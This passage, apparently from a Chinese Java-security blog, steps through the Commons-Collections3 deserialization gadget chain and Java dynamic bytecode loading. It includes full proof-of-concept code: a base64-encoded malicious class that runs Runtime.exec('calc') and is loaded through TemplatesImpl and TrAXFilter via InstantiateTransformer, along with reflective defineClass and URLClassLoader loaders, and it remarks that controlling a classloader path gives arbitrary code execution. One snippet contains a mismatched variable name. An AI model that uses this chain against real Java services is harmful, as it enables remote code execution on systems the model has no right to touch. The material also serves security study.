class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package CommonsCollections3;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc3&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] bytes = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        //templates.newTransformer();</span><br><span class="line">        </span><br><span class="line">//cc1+cc3</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;,null,null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line"></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/JAVA-CommonsCollections3/2.jpg"></p><p>但 这不是真正的 CC3 ，CC3的目的是为了绕过CC1的限制，也就是对InvokerTransformer的限制，有些 反序列化的过滤器的黑名单 就有了 InvokerTransformer ，因此CC3真正绕过的是他。</p><p>ysoserial的作者找到了com.sun.org.apache.xalan.internal.xsltc.trax下面的TrAXFilter类，它的构造器非常有意思，调用了newTransformer ，免去了我们手工调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public TrAXFilter(Templates templates)  throws</span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = new TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正如我第一张图所示  ，当然了，缺少了 InvokerTransformer，TrAXFilter的构造⽅法也是⽆法调⽤的，<br>这里会用到一个新的 Transformer ： org.apache.commons.collections.functors.InstantiateTransformer  他的作⽤就是调⽤构造⽅法</p><p>所以 我们实现的目标就是 利用 InstantiateTransformer 去实例化这个 TrAXFilter，使其去自动调用他的构造方法 ，其构造方法就会自动调用 templates.newTransformer()，里面放入我们的字节码，则可利用成功~  妙！</p><h1 id="POC构造分析"><a href="#POC构造分析" class="headerlink" title="POC构造分析"></a>POC构造分析</h1><p>可能很多小伙伴不知道 POC是怎么样的一个流程，自写POC也比较困难，大部分文章讲的也模棱两可，希望这个构造分析对你有所帮助</p><h2 id="构造字节码"><a href="#构造字节码" class="headerlink" title="构造字节码"></a>构造字节码</h2><p>这个大家应该都知道，就是要利用到恶意字节码，也就是要调用 Templatesimpl.newTransformer 去加载我们的恶意字节码，所以我们先构造所需的字节码 byte：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上篇 我们分析过，将字节码 放入bytecodes 中进行加载，再满足一些参数需求则可以利用 成功</p><p>再此之前，思考个问题， JAVA反序列化是否不同于PHP，JAVA的则是先构造出口，也就是从后往前构造，PHP则相反（ 可能只有我这么认为 哈哈哈</p><h2 id="构造InstantiateTransformer与TrAXFilter"><a href="#构造InstantiateTransformer与TrAXFilter" class="headerlink" title="构造InstantiateTransformer与TrAXFilter"></a>构造InstantiateTransformer与TrAXFilter</h2><p>可以看到第一张图，接下来需要构造 TrAXFilter.class 了，因为此类可以调用到 newTransformer()<br>但又因为 利用点是构造器，需要实例化此类才能调用，则 又关联到了另一个类 InstantiateTransformer.class,该类有 TrAXFilter.class 需要的 newInstance() 方法，所以我们构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trueTransformers = new Transformer[]&#123;  </span><br><span class="line">    new ConstantTransformer(Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;)),  </span><br><span class="line">    new InstantiateTransformer(  </span><br><span class="line">        new Class[]&#123;Templates.class&#125;,  </span><br><span class="line">        new Object[]&#123;templates&#125;  </span><br><span class="line">    )  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformers);</span><br></pre></td></tr></table></figure><p>Transformer大家都知道，接着 new InstantiateTransformer()传入这里进行了 有参构造：</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/4.jpg"></p><p>接着调用 transform方法</p><p>此时的 con&#x3D;TrAXFilter.class.getConstructor(templates)， 然后这里的IAgs 是我们的字节码~</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/3.jpg"></p><p>紧接着就能 newInstance() -&gt;newTransformer()</p><p>接下来就是拼接 CC1 连接 InstantiateTransformer.class这段了，到了这块，就很简单了，就给Map设置几个基础值就好了。</p><p>这里直接贴了，就不做过多讲解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap innerMap = new HashMap();  </span><br><span class="line">Map outmap = TransformedMap.decorate(innerMap, null, chainedTransformer);  </span><br><span class="line">outmap.put(&quot;test&quot;,&quot;xxx&quot;);</span><br></pre></td></tr></table></figure><p>完整POC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class POC &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] trueTransformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;)),  </span><br><span class="line">            new InstantiateTransformer(  </span><br><span class="line">                new Class[]&#123;Templates.class&#125;,  </span><br><span class="line">                new Object[]&#123;templates&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outmap = TransformedMap.decorate(innerMap, null, chainedTransformer);  </span><br><span class="line">        outmap.put(&quot;test&quot;,&quot;xxx&quot;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器~</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/exc.jpg"></p><p>希望对你有所帮助 ~</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA动态加载字节码</title>
      <link href="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是JAVA的字节码？"><a href="#什么是JAVA的字节码？" class="headerlink" title="什么是JAVA的字节码？"></a>什么是JAVA的字节码？</h1><p>字节码 其实指的是Java虚拟机运行执行的指令，通过编译后，通常被储存在  .class   文件中。<br>因为语言是跨平台的，其他语言可以通过编译成  .class  文件后，在Java虚拟机中运行~<br>但本文想要说的是字节码 可以将.class 文件 恢复成一个类，在Jvm虚拟机中加载。</p><h1 id="利用URLClassLoader-加载远程文件"><a href="#利用URLClassLoader-加载远程文件" class="headerlink" title="利用URLClassLoader 加载远程文件"></a>利用URLClassLoader 加载远程文件</h1><p>正常情况下 会以 三种情况来寻找  .class 文件 ：</p><ul><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li></ul><p>如果是非 file 协议的情况下，最常见使用的协议 则是  http 协议</p><p>接下来测试一下在JAVA中是否能够从远程 HTTP 中加载 .class 文件：</p><p>起一个测试文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">  </span><br><span class="line">import java.net.URL;  </span><br><span class="line">import java.net.URLClassLoader;  </span><br><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main( String[] args ) throws Exception &#123;  </span><br><span class="line">        URL[] urls = &#123;new URL(&quot;http://localhost:8000/&quot;)&#125;;  </span><br><span class="line">        URLClassLoader loader = URLClassLoader.newInstance(urls);  </span><br><span class="line">        Class c = loader.loadClass(&quot;Hello&quot;);  </span><br><span class="line">        c.newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hello.java:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">  </span><br><span class="line">public class Hello &#123;  </span><br><span class="line">    public Hello() throws IOException &#123;  </span><br><span class="line">  </span><br><span class="line">        System.out.println(&quot;Hello World&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 Hello.java 编译成 .class 文件 并在本目录起个 Python 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/1.png" alt="one"></p><p>成功请求到 Hello.class 并执行了其中的字节码 输出Hello World，如果能控制目标 Java ClassLoader的路径作为一个http服务器，则可以利用远程加载的方式执行任意代码。</p><h1 id="利用ClassLoader-define加载远程字节码"><a href="#利用ClassLoader-define加载远程字节码" class="headerlink" title="利用ClassLoader#define加载远程字节码"></a>利用ClassLoader#define加载远程字节码</h1><p>无论是加载远程文件 还是本地的 jar  或 .class  都会经过三个方法的调用。</p><p>通俗的分类：</p><ul><li>loadClass 在本地类缓存中、夫加载器中寻找类，如没有找到，则执行 findClass</li><li>findClass 根据基础 URL指定的方式 来加载类的字节码 然后交给 defineClass</li><li>defineClass 处理前面传入的字节码，将其处理成真正的Java类</li></ul><p>可见核心是 defineClass  他的行为就是将字节码的形式转换成一个Java类。</p><p>在  defineClass   调用时，类对象是不会被初始化的，只有这个对象 显式 的调用 构造函数  初始化代码才会执行，即使是放入static 块中。  ClassLoader 类中的 defineClass  是个  protected  属性，所以如果我们想要使用  defineClass  则需要使用  反射  来调用 ,这个  defineClass   是  TemplateImpl  攻击链的重点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">import java.lang.reflect.Method;  </span><br><span class="line">import java.util.Base64;  </span><br><span class="line">public class HelloDefineClass &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);  </span><br><span class="line">        defineClass.setAccessible(true);  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;);  </span><br><span class="line">        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Hello&quot;, code, 0, code.length);  </span><br><span class="line">        hello.newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="利用TemplatesImpl进行加载字节码"><a href="#利用TemplatesImpl进行加载字节码" class="headerlink" title="利用TemplatesImpl进行加载字节码"></a>利用TemplatesImpl进行加载字节码</h1><p>底层链 运用到了 我们的主角  defineClass   ~  </p><p>依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>本来不想跟链子的，之前也审过没发出来，  但作为本篇的第一篇 还是跟一下吧</p><p>在   TemplatesImpl   的  TransletClassLoader  重载了  defineClass   方法 ，有点长，去头去尾贴出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">static final class TransletClassLoader extends ClassLoader &#123;  </span><br><span class="line">    private final Map&lt;String, Class&lt;?&gt;&gt; _loadedExternalExtensionFunctions;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;  </span><br><span class="line">        Class&lt;?&gt; ret = null;  </span><br><span class="line">        // The _loadedExternalExtensionFunctions will be empty when the  </span><br><span class="line">        // SecurityManager is not set and the FSP is turned off        if (_loadedExternalExtensionFunctions != null) &#123;  </span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);  </span><br><span class="line">        &#125;  </span><br><span class="line">        if (ret   null) &#123;  </span><br><span class="line">            ret = super.loadClass(name);  </span><br><span class="line">        &#125;  </span><br><span class="line">        return ret;  </span><br><span class="line">     &#125;  </span><br><span class="line">    </span><br><span class="line">     Class&lt;?&gt; defineClass(final byte[] b) &#123;  </span><br><span class="line">        return defineClass(null, b, 0, b.length);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; defineClass(final byte[] b, ProtectionDomain pd) &#123;  </span><br><span class="line">        return defineClass(null, b, 0, b.length, pd);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 defineClass  没有写明类型，默认为default 所以只能被内部调用。</p><p>再跟进谁调用了 此  defineClass(x,y)  在 defineTransletClasses() 中发现 ：</p><p>代码很长 只贴部分<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/2.png" alt="one"></p><p>调用了 两个形参的 defineClass ，再紧接着 跟进谁调用了  defineTransletClasses ，发现是   getTransletInstance </p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/3.png" alt="one"></p><p>再向上取   newTransformer  调用了  getTransletInstance   而newTransformer 又被getOutputProperties调用 ，至此结束，并且  newTransformer  和  getOutputProperties 是一个public 的类型，可以被外部调用。</p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/4.png" alt="one"></p><p>调用链为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; </span><br><span class="line">TemplatesImpl#newTransformer() -&gt; </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知道了 调用链，就要开始满足 其调用的传参，也就是构成exp 的细节 从调用链的开头来设计参数，从  newTransformer  开始 ：</p><p>调用了   getTransletInstance()  且不需要传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public synchronized Transformer newTransformer()  </span><br><span class="line">    throws TransformerConfigurationException  </span><br><span class="line">&#123;  </span><br><span class="line">    TransformerImpl transformer;  </span><br><span class="line">  </span><br><span class="line">    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,  </span><br><span class="line">        _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure><p> getTransletInstance() </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private Translet getTransletInstance()  </span><br><span class="line">    throws TransformerConfigurationException &#123;  </span><br><span class="line">    try &#123;  </span><br><span class="line">        if (_name   null) return null;  </span><br><span class="line">  </span><br><span class="line">        if (_class   null) defineTransletClasses();</span><br></pre></td></tr></table></figure><p>这里需要满足  name 和 class  不为 null，  才会调用  defineTransletClasses()<br>这里的两个值 都是保护属性，所以我们需要反射 